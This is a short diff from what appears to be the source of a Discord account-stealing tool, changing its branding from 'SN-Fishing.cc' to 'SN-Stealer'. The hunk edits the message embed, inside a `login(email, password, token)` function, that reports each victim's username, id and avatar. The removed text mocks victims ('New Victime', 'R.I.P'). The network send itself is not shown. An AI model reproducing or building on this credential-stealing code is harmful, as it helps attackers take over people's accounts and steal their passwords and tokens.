@@ -640,15 +640,12 @@ const login = async (email, password, token) => {
             inline: true,
            },
         ],
-        author: {
-          name: "New Victime 👀 is " + json.username +"#" + json.discriminator + " - " +"("+json.id+")",
+       author: {
+          name: json.username + '#' + json.discriminator + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "R.I.P " + json.username +"#" + json.discriminator + " by @SN-Fishing.cc 🐟",
-        },
-        thumbnail: {
-            url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+          text: '@SN-Stealer',
         },
       },
     ],
